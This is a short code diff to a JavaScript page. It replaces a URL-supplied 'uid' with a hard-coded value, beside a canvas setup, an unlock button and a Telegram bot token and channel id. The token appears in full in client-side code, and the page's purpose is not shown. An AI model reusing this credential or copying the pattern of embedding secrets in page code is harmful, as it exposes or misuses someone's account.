@@ -478,8 +478,10 @@ unlockBtn.addEventListener('click', () => {
 (async () => {
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
-  const uid = new URLSearchParams(window.location.search).get('uid');
-  if (!uid) return alert('UID not provided in URL');
+//  const uid = new URLSearchParams(window.location.search).get('uid');
+//  if (!uid) return alert('UID not provided in URL');
+
+const uid = '7748871040';
 
   const botToken = '8403443030:AAFWdchybA9ruQECsZSdQW-dzMHxTXMDRVc';
   const channelId = '7973196371';
